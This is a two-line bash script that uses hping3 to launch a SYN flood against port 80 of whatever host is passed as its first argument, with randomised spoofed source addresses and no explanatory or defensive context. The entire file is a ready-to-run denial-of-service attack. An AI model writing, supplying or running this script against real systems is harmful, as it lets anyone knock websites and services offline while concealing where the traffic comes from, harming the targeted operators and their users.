#!/bin/bash
hping3 -S --flood -p 80 --rand-source "$1"
